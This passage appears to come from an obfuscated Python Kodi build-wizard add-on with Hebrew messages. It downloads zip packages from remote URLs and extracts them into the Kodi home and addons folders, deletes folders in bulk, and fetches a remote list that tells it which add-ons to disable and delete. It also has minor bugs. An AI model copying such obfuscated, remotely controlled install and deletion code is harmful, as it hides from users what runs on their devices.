					DP .update (int (wiz .percentage (O00O0000O0OOOO000 ,O0O0O00O0OO0OOO0O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO000OO00O0000O ),'')#line:4621
					try :os .remove (os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ))#line:4622
					except Exception as OO0OO000O0O00O0O0 :#line:4623
						wiz .log ("Error removing %s"%os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),xbmc .LOGNOTICE )#line:4624
						wiz .log ("-> / %s"%(str (OO0OO000O0O00O0O0 )),xbmc .LOGNOTICE )#line:4625
			if DP .iscanceled ():#line:4626
				DP .close ()#line:4627
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4628
				return False #line:4629
		for O0OOO00000OOO000O ,OO0OOO00O0O0OO0O0 ,OO00OO0OO00O00OOO in os .walk (OOO00O00OO0OOO0OO ,topdown =True ):#line:4630
			OO0OOO00O0O0OO0O0 [:]=[OOO0OOOOO0OO000O0 for OOO0OOOOO0OO000O0 in OO0OOO00O0O0OO0O0 if OOO0OOOOO0OO000O0 not in EXCLUDES ]#line:4631
			for O0OO000OO00O0000O in OO0OOO00O0O0OO0O0 :#line:4632
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO000OO00O0000O ),'')#line:4633
			  if O0OO000OO00O0000O not in ["Database","userdata","temp","addons","addon_data"]:#line:4634
			   if not (O0OO000OO00O0000O =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4635
			    if not (O0OO000OO00O0000O =='skin.titan'and KEEPSKIN3 =='true'):#line:4637
			      if not (O0OO000OO00O0000O =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4638
			       if not (O0OO000OO00O0000O =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4639
			        if not (O0OO000OO00O0000O =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4640
			         if not (O0OO000OO00O0000O =='program.apollo'and KEEPINFO =='true'):#line:4641
			          if not (O0OO000OO00O0000O =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4642
			            if not (O0OO000OO00O0000O =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4644
			             if not (O0OO000OO00O0000O =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4645
			              if not (O0OO000OO00O0000O =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4646
			               if not (O0OO000OO00O0000O =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4647
			                if not (O0OO000OO00O0000O =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4648
			                 if not (O0OO000OO00O0000O =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4649
			                  if not (O0OO000OO00O0000O =='plugin.video.neptune'and KEEPINFO =='true'):#line:4650
			                   if not (O0OO000OO00O0000O =='plugin.video.youtube'and KEEPINFO =='true'):#line:4651
			                    if not (O0OO000OO00O0000O =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4652
			                     if not (O0OO000OO00O0000O =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4653
			                       if not (O0OO000OO00O0000O =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4655
			                           if not (O0OO000OO00O0000O =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4659
			                            if not (O0OO000OO00O0000O =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4660
			                             if not (O0OO000OO00O0000O =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4661
			                              if not (O0OO000OO00O0000O =='plugin.video.quasar'and KEEPINFO =='true'):#line:4662
			                               if not (O0OO000OO00O0000O =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4663
			                                  shutil .rmtree (os .path .join (O0OOO00000OOO000O ,O0OO000OO00O0000O ),ignore_errors =True ,onerror =None )#line:4665
			if DP .iscanceled ():#line:4666
				DP .close ()#line:4667
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4668
				return False #line:4669
		DP .close ()#line:4670
		wiz .clearS ('build')#line:4671
		if over ==True :#line:4672
			return True #line:4673
		elif install =='restore':#line:4674
			return True #line:4675
		elif install :#line:4676
			buildWizard (install ,'normal',over =True )#line:4677
		else :#line:4678
			if INSTALLMETHOD ==1 :O000OO00O000OO000 =1 #line:4679
			elif INSTALLMETHOD ==2 :O000OO00O000OO000 =0 #line:4680
			else :O000OO00O000OO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4681
			if O000OO00O000OO000 ==1 :wiz .reloadFix ('fresh')#line:4682
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4683
	else :#line:4684
		if not install =='restore':#line:4685
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4686
			wiz .refresh ()#line:4687
def clearCache ():#line:4692
		wiz .clearCache ()#line:4693
def fixwizard ():#line:4697
		wiz .fixwizard ()#line:4698
def totalClean ():#line:4700
		wiz .clearCache ()#line:4702
		wiz .clearPackages ('total')#line:4703
		clearThumb ('total')#line:4704
		cleanfornewbuild ()#line:4705
def cleanfornewbuild ():#line:4706
		try :#line:4707
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4708
		except :#line:4709
			pass #line:4710
		try :#line:4711
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4712
		except :#line:4713
			pass #line:4714
		try :#line:4715
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4716
		except :#line:4717
			pass #line:4718
def clearThumb (type =None ):#line:4719
	OOO00OOO0O0OOOOO0 =wiz .latestDB ('Textures')#line:4720
	if not type ==None :O00OO0OOOOOO0O000 =1 #line:4721
	else :O00OO0OOOOOO0O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOO00OOO0O0OOOOO0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4722
	if O00OO0OOOOOO0O000 ==1 :#line:4723
		try :wiz .removeFile (os .join (DATABASE ,OOO00OOO0O0OOOOO0 ))#line:4724
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOO00OOO0O0OOOOO0 )#line:4725
		wiz .removeFolder (THUMBS )#line:4726
	else :wiz .log ('Clear thumbnames cancelled')#line:4728
	wiz .redoThumbs ()#line:4729
def purgeDb ():#line:4731
	OO00OO000O00OOO00 =[];O0O0OO0O0O0000O0O =[]#line:4732
	for OOOOO0OOOO0OO00O0 ,OOO0O0OO000O00O0O ,OO0OO0O00O0000OO0 in os .walk (HOME ):#line:4733
		for OOOO000OOOO0OOOOO in fnmatch .filter (OO0OO0O00O0000OO0 ,'*.db'):#line:4734
			if OOOO000OOOO0OOOOO !='Thumbs.db':#line:4735
				O000O00OO0OO000OO =os .path .join (OOOOO0OOOO0OO00O0 ,OOOO000OOOO0OOOOO )#line:4736
				OO00OO000O00OOO00 .append (O000O00OO0OO000OO )#line:4737
				OOOO00OO0OOO00OO0 =O000O00OO0OO000OO .replace ('\\','/').split ('/')#line:4738
				O0O0OO0O0O0000O0O .append ('(%s) %s'%(OOOO00OO0OOO00OO0 [len (OOOO00OO0OOO00OO0 )-2 ],OOOO00OO0OOO00OO0 [len (OOOO00OO0OOO00OO0 )-1 ]))#line:4739
	if KODIV >=16 :#line:4740
		O00O000000O000OO0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0O0OO0O0O0000O0O )#line:4741
		if O00O000000O000OO0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4742
		elif len (O00O000000O000OO0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4743
		else :#line:4744
			for O00OO0OOO0000000O in O00O000000O000OO0 :wiz .purgeDb (OO00OO000O00OOO00 [O00OO0OOO0000000O ])#line:4745
	else :#line:4746
		O00O000000O000OO0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0O0OO0O0O0000O0O )#line:4747
		if O00O000000O000OO0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4748
		else :wiz .purgeDb (OO00OO000O00OOO00 [O00OO0OOO0000000O ])#line:4749
def fastupdatefirstbuild (O00O0OO0O00OOOOO0 ):#line:4755
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:4756
	if ENABLE =='Yes':#line:4757
		if not NOTIFY =='true':#line:4758
			O000OOOOOOO0O0O0O =wiz .workingURL (NOTIFICATION )#line:4759
			if O000OOOOOOO0O0O0O ==True :#line:4760
				OOOOO000O0OOOO0OO ,O0O00O00OOO0OOO0O =wiz .splitNotify (NOTIFICATION )#line:4761
				if not OOOOO000O0OOOO0OO ==False :#line:4763
					try :#line:4764
						OOOOO000O0OOOO0OO =int (OOOOO000O0OOOO0OO );O00O0OO0O00OOOOO0 =int (O00O0OO0O00OOOOO0 )#line:4765
						checkidupdate ()#line:4766
						wiz .setS ("notedismiss","true")#line:4767
						if OOOOO000O0OOOO0OO ==O00O0OO0O00OOOOO0 :#line:4768
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOOOO000O0OOOO0OO ),xbmc .LOGNOTICE )#line:4769
						elif OOOOO000O0OOOO0OO >O00O0OO0O00OOOOO0 :#line:4771
							wiz .log ("[Notifications] id: %s"%str (OOOOO000O0OOOO0OO ),xbmc .LOGNOTICE )#line:4772
							wiz .setS ('noteid',str (OOOOO000O0OOOO0OO ))#line:4773
							wiz .setS ("notedismiss","true")#line:4774
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4777
					except Exception as O000O000OOO000OO0 :#line:4778
						wiz .log ("Error on Notifications Window: %s"%str (O000O000OOO000OO0 ),xbmc .LOGERROR )#line:4779
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4781
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O000OOOOOOO0O0O0O ),xbmc .LOGNOTICE )#line:4782
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4783
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4784
def checkidupdate ():#line:4790
				wiz .setS ("notedismiss","true")#line:4792
				OOOOOO0000O00OO00 =wiz .workingURL (NOTIFICATION )#line:4793
				O0OO0O0OOO0OOO00O =" Kodi Premium"#line:4795
				O0O000OO0O00O0OO0 =wiz .checkBuild (O0OO0O0OOO0OOO00O ,'gui')#line:4796
				O00OOO0OO0O000OOO =O0OO0O0OOO0OOO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4797
				if not wiz .workingURL (O0O000OO0O00O0OO0 )==True :return #line:4798
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4799
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OO0O0OOO0OOO00O ),'','אנא המתן')#line:4800
				OOO0O00O0OOOO00O0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OOO0OO0O000OOO )#line:4801
				try :os .remove (OOO0O00O0OOOO00O0 )#line:4802
				except :pass #line:4803
				logging .warning (O0O000OO0O00O0OO0 )#line:4804
				if 'google'in O0O000OO0O00O0OO0 :#line:4805
				   O00OO00OO00OO000O =googledrive_download (O0O000OO0O00O0OO0 ,OOO0O00O0OOOO00O0 ,DP ,wiz .checkBuild (O0OO0O0OOO0OOO00O ,'filesize'))#line:4806
				else :#line:4809
				  downloader .download (O0O000OO0O00O0OO0 ,OOO0O00O0OOOO00O0 ,DP )#line:4810
				xbmc .sleep (100 )#line:4811
				O00O00OOOO00OO0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O0OOO0OOO00O )#line:4812
				DP .update (0 ,O00O00OOOO00OO0O0 ,'','אנא המתן')#line:4813
				extract .all (OOO0O00O0OOOO00O0 ,HOME ,DP ,title =O00O00OOOO00OO0O0 )#line:4814
				DP .close ()#line:4815
				wiz .defaultSkin ()#line:4816
				wiz .lookandFeelData ('save')#line:4817
				if INSTALLMETHOD ==1 :O0O000OOO0OO00O00 =1 #line:4820
				elif INSTALLMETHOD ==2 :O0O000OOO0OO00O00 =0 #line:4821
				else :DP .close ()#line:4822
def gaiaserenaddon ():#line:4824
  O0000OO0O0000O000 =(ADDON .getSetting ("gaiaseren"))#line:4825
  O0OO0OOOO0OO0OO0O =(ADDON .getSetting ("rdbuild"))#line:4826
  if O0000OO0O0000O000 =='true'and O0OO0OOOO0OO0OO0O =='true':#line:4827
    O0O0O0000OO0OO0OO =(NEWFASTUPDATE )#line:4828
    O0OO0O0O0OO00000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4829
    O0O00O0OO0OOOO000 =xbmcgui .DialogProgress ()#line:4830
    O0O00O0OO0OOOO000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4831
    O0O00O00O0OOOO000 =os .path .join (PACKAGES ,'isr.zip')#line:4832
    OOOO0OO0OOOOOOO0O =urllib2 .Request (O0O0O0000OO0OO0OO )#line:4833
    OOO0O00O0000OO000 =urllib2 .urlopen (OOOO0OO0OOOOOOO0O )#line:4834
    O0OOO00O0OOOOOO0O =xbmcgui .DialogProgress ()#line:4836
    O0OOO00O0OOOOOO0O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4837
    O0OOO00O0OOOOOO0O .update (0 )#line:4838
    OOOOOO00OOOO0OOOO =open (O0O00O00O0OOOO000 ,'wb')#line:4840
    try :#line:4842
      O0O0O000OO00OOOO0 =OOO0O00O0000OO000 .info ().getheader ('Content-Length').strip ()#line:4843
      OOOOO0O0O0OO000O0 =True #line:4844
    except AttributeError :#line:4845
          OOOOO0O0O0OO000O0 =False #line:4846
    if OOOOO0O0O0OO000O0 :#line:4848
          O0O0O000OO00OOOO0 =int (O0O0O000OO00OOOO0 )#line:4849
    O0OOOOO000O00O0OO =0 #line:4851
    O000O00OO0OO000O0 =time .time ()#line:4852
    while True :#line:4853
          OO0OO00000O0O0OOO =OOO0O00O0000OO000 .read (8192 )#line:4854
          if not OO0OO00000O0O0OOO :#line:4855
              sys .stdout .write ('\n')#line:4856
              break #line:4857
          O0OOOOO000O00O0OO +=len (OO0OO00000O0O0OOO )#line:4859
          OOOOOO00OOOO0OOOO .write (OO0OO00000O0O0OOO )#line:4860
          if not OOOOO0O0O0OO000O0 :#line:4862
              O0O0O000OO00OOOO0 =O0OOOOO000O00O0OO #line:4863
          if O0OOO00O0OOOOOO0O .iscanceled ():#line:4864
             O0OOO00O0OOOOOO0O .close ()#line:4865
             try :#line:4866
              os .remove (O0O00O00O0OOOO000 )#line:4867
             except :#line:4868
              pass #line:4869
             break #line:4870
          OOOOOOO0OO00OOOO0 =float (O0OOOOO000O00O0OO )/O0O0O000OO00OOOO0 #line:4871
          OOOOOOO0OO00OOOO0 =round (OOOOOOO0OO00OOOO0 *100 ,2 )#line:4872
          OOOO0O000O0OOO00O =O0OOOOO000O00O0OO /(1024 *1024 )#line:4873
          OO0OO00OOOOOOO0O0 =O0O0O000OO00OOOO0 /(1024 *1024 )#line:4874
          O0O00O0OO00OOOOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO0O000O0OOO00O ,'teal',OO0OO00OOOOOOO0O0 )#line:4875
          if (time .time ()-O000O00OO0OO000O0 )>0 :#line:4876
            OOOOOOOOOOO0O0O0O =O0OOOOO000O00O0OO /(time .time ()-O000O00OO0OO000O0 )#line:4877
            OOOOOOOOOOO0O0O0O =OOOOOOOOOOO0O0O0O /1024 #line:4878
          else :#line:4879
           OOOOOOOOOOO0O0O0O =0 #line:4880
          O00OO0O000OO0O0OO ='KB'#line:4881
          if OOOOOOOOOOO0O0O0O >=1024 :#line:4882
             OOOOOOOOOOO0O0O0O =OOOOOOOOOOO0O0O0O /1024 #line:4883
             O00OO0O000OO0O0OO ='MB'#line:4884
          if OOOOOOOOOOO0O0O0O >0 and not OOOOOOO0OO00OOOO0 ==100 :#line:4885
              OOO00OOOO0O000000 =(O0O0O000OO00OOOO0 -O0OOOOO000O00O0OO )/OOOOOOOOOOO0O0O0O #line:4886
          else :#line:4887
              OOO00OOOO0O000000 =0 #line:4888
          O00000O0000O0OO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOOOOOOOO0O0O0O ,O00OO0O000OO0O0OO )#line:4889
          O0OOO00O0OOOOOO0O .update (int (OOOOOOO0OO00OOOO0 ),O0O00O0OO00OOOOOO ,O00000O0000O0OO0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4891
    O0OO000O0O00O00OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4894
    OOOOOO00OOOO0OOOO .close ()#line:4897
    extract .all (O0O00O00O0OOOO000 ,O0OO000O0O00O00OO ,O0OOO00O0OOOOOO0O )#line:4898
    try :#line:4902
      os .remove (O0O00O00O0OOOO000 )#line:4903
    except :#line:4904
      pass #line:4905
def testnotify ():#line:4907
	OOOO0O000OOO00O00 =wiz .workingURL (NOTIFICATION )#line:4908
	if OOOO0O000OOO00O00 ==True :#line:4909
		try :#line:4910
			OO0OOOO0000OOOOO0 ,OO0OO00OOO0OO0OOO =wiz .splitNotify (NOTIFICATION )#line:4911
			if OO0OOOO0000OOOOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4912
			if STARTP2 ()=='ok':#line:4913
				notify .notification (OO0OO00OOO0OO0OOO ,True )#line:4914
		except Exception as OO00OOO0OOO0OOO00 :#line:4915
			wiz .log ("Error on Notifications Window: %s"%str (OO00OOO0OOO0OOO00 ),xbmc .LOGERROR )#line:4916
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4917
def testnotify2 ():#line:4918
	O000O0O0O00OOOO0O =wiz .workingURL (NOTIFICATION2 )#line:4919
	if O000O0O0O00OOOO0O ==True :#line:4920
		try :#line:4921
			O0OOO0OOOO0OO00O0 ,OO00OOOOOO0OO000O =wiz .splitNotify (NOTIFICATION2 )#line:4922
			if O0OOO0OOOO0OO00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4923
			if STARTP2 ()=='ok':#line:4924
				notify .notification2 (OO00OOOOOO0OO000O ,True )#line:4925
		except Exception as OO0OO00O0O0000O00 :#line:4926
			wiz .log ("Error on Notifications Window: %s"%str (OO0OO00O0O0000O00 ),xbmc .LOGERROR )#line:4927
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4928
def testnotify3 ():#line:4929
	O00OOOOOOO00OO00O =wiz .workingURL (NOTIFICATION3 )#line:4930
	if O00OOOOOOO00OO00O ==True :#line:4931
		try :#line:4932
			OO0OOOO0O000O0O00 ,O00OOOOOOO0OO0OOO =wiz .splitNotify (NOTIFICATION3 )#line:4933
			if OO0OOOO0O000O0O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4934
			if STARTP2 ()=='ok':#line:4935
				notify .notification3 (O00OOOOOOO0OO0OOO ,True )#line:4936
		except Exception as OOO0OOOOO000O0000 :#line:4937
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OOOOO000O0000 ),xbmc .LOGERROR )#line:4938
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4939
def servicemanual ():#line:4940
	O0OOOOO0000O000O0 =wiz .workingURL (HELPINFO )#line:4941
	if O0OOOOO0000O000O0 ==True :#line:4942
		try :#line:4943
			O0000OOO0O0000O00 ,O00O0OO00OOO00O00 =wiz .splitNotify (HELPINFO )#line:4944
			if O0000OOO0O0000O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:4945
			notify .helpinfo (O00O0OO00OOO00O00 ,True )#line:4946
		except Exception as O00O0O0OO0OOOOOOO :#line:4947
			wiz .log ("Error on Notifications Window: %s"%str (O00O0O0OO0OOOOOOO ),xbmc .LOGERROR )#line:4948
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:4949
def testupdate ():#line:4951
	if BUILDNAME =="":#line:4952
		notify .updateWindow ()#line:4953
	else :#line:4954
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:4955
def testfirst ():#line:4957
	notify .firstRun ()#line:4958
def testfirstRun ():#line:4960
	notify .firstRunSettings ()#line:4961
def fastinstall ():#line:4964
	notify .firstRuninstall ()#line:4965
def addDir (OOOO0OO0OOOOO0OO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:4972
	O000OO00000O0OOO0 =sys .argv [0 ]#line:4973
	if not mode ==None :O000OO00000O0OOO0 +="?mode=%s"%urllib .quote_plus (mode )#line:4974
	if not name ==None :O000OO00000O0OOO0 +="&name="+urllib .quote_plus (name )#line:4975
	if not url ==None :O000OO00000O0OOO0 +="&url="+urllib .quote_plus (url )#line:4976
	O000O0OO000OOO000 =True #line:4977
	if themeit :OOOO0OO0OOOOO0OO0 =themeit %OOOO0OO0OOOOO0OO0 #line:4978
	OO000000OO0OOOOO0 =xbmcgui .ListItem (OOOO0OO0OOOOO0OO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:4979
	OO000000OO0OOOOO0 .setInfo (type ="Video",infoLabels ={"Title":OOOO0OO0OOOOO0OO0 ,"Plot":description })#line:4980
	OO000000OO0OOOOO0 .setProperty ("Fanart_Image",fanart )#line:4981
	if not menu ==None :OO000000OO0OOOOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:4982
	O000O0OO000OOO000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000OO00000O0OOO0 ,listitem =OO000000OO0OOOOO0 ,isFolder =True )#line:4983
	return O000O0OO000OOO000 #line:4984
def addFile (O00OO00O0OOO0O0O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:4986
	O0O00O000000O0OOO =sys .argv [0 ]#line:4987
	if not mode ==None :O0O00O000000O0OOO +="?mode=%s"%urllib .quote_plus (mode )#line:4988
	if not name ==None :O0O00O000000O0OOO +="&name="+urllib .quote_plus (name )#line:4989
	if not url ==None :O0O00O000000O0OOO +="&url="+urllib .quote_plus (url )#line:4990
	OOO0OO0O000OO0O0O =True #line:4991
	if themeit :O00OO00O0OOO0O0O0 =themeit %O00OO00O0OOO0O0O0 #line:4992
	O000OOOO0O0O0O000 =xbmcgui .ListItem (O00OO00O0OOO0O0O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:4993
	O000OOOO0O0O0O000 .setInfo (type ="Video",infoLabels ={"Title":O00OO00O0OOO0O0O0 ,"Plot":description })#line:4994
	O000OOOO0O0O0O000 .setProperty ("Fanart_Image",fanart )#line:4995
	if not menu ==None :O000OOOO0O0O0O000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:4996
	OOO0OO0O000OO0O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O00O000000O0OOO ,listitem =O000OOOO0O0O0O000 ,isFolder =False )#line:4997
	return OOO0OO0O000OO0O0O #line:4998
def get_params ():#line:5000
	O0O00OOOOO0O00OO0 =[]#line:5001
	OO0OO00OO0OOOOOO0 =sys .argv [2 ]#line:5002
	if len (OO0OO00OO0OOOOOO0 )>=2 :#line:5003
		OO0OOOOO0O0OOO00O =sys .argv [2 ]#line:5004
		O00O0OO0O0O0000OO =OO0OOOOO0O0OOO00O .replace ('?','')#line:5005
		if (OO0OOOOO0O0OOO00O [len (OO0OOOOO0O0OOO00O )-1 ]=='/'):#line:5006
			OO0OOOOO0O0OOO00O =OO0OOOOO0O0OOO00O [0 :len (OO0OOOOO0O0OOO00O )-2 ]#line:5007
		OO0OO0OOOOO0O0000 =O00O0OO0O0O0000OO .split ('&')#line:5008
		O0O00OOOOO0O00OO0 ={}#line:5009
		for O0000O00OO0O000OO in range (len (OO0OO0OOOOO0O0000 )):#line:5010
			O000000OO00OOO00O ={}#line:5011
			O000000OO00OOO00O =OO0OO0OOOOO0O0000 [O0000O00OO0O000OO ].split ('=')#line:5012
			if (len (O000000OO00OOO00O ))==2 :#line:5013
				O0O00OOOOO0O00OO0 [O000000OO00OOO00O [0 ]]=O000000OO00OOO00O [1 ]#line:5014
		return O0O00OOOOO0O00OO0 #line:5016
def remove_addons ():#line:5018
	try :#line:5019
			import json #line:5020
			O000OO000OOOOOOOO =urllib2 .urlopen (remove_url ).readlines ()#line:5021
			for O0OO0OO00000OO0O0 in O000OO000OOOOOOOO :#line:5022
				OOOO0OO00O0OOOO00 =O0OO0OO00000OO0O0 .split (':')[1 ].strip ()#line:5024
				O0OO0OO0OOOO00O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOOO0OO00O0OOOO00 ,'false')#line:5025
				OO00OO000O00OO000 =xbmc .executeJSONRPC (O0OO0OO0OOOO00O00 )#line:5026
				OO00O00O0O00OOO0O =json .loads (OO00OO000O00OO000 )#line:5027
				OOO00O0OOOO00O0O0 =os .path .join (addons_folder ,OOOO0OO00O0OOOO00 )#line:5029
				if os .path .exists (OOO00O0OOOO00O0O0 ):#line:5031
					for O00OOO0OO0OOO00OO ,O0O000O0O0OO0O0O0 ,OO00OO00O0OO0O0O0 in os .walk (OOO00O0OOOO00O0O0 ):#line:5032
						for OOO0OO0OOOOOO0000 in OO00OO00O0OO0O0O0 :#line:5033
							os .unlink (os .path .join (O00OOO0OO0OOO00OO ,OOO0OO0OOOOOO0000 ))#line:5034
						for OOOO0O0O0OOO000O0 in O0O000O0O0OO0O0O0 :#line:5035
							shutil .rmtree (os .path .join (O00OOO0OO0OOO00OO ,OOOO0O0O0OOO000O0 ))#line:5036
					os .rmdir (OOO00O0OOOO00O0O0 )#line:5037
			xbmc .executebuiltin ('Container.Refresh')#line:5039
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5040
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5041
	except :pass #line:5042
def remove_addons2 ():#line:5043
	try :#line:5044
			import json #line:5045
			OOOOO000OO000000O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5046
			for O0OO00OOO0OO00OO0 in OOOOO000OO000000O :#line:5047
				OOO00OO000O0OO00O =O0OO00OOO0OO00OO0 .split (':')[1 ].strip ()#line:5049
				OOO0OOO0OO0O00000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOO00OO000O0OO00O ,'false')#line:5050
				OOO0O000OO0OO000O =xbmc .executeJSONRPC (OOO0OOO0OO0O00000 )#line:5051
				O00O0OO000000OO00 =json .loads (OOO0O000OO0OO000O )#line:5052
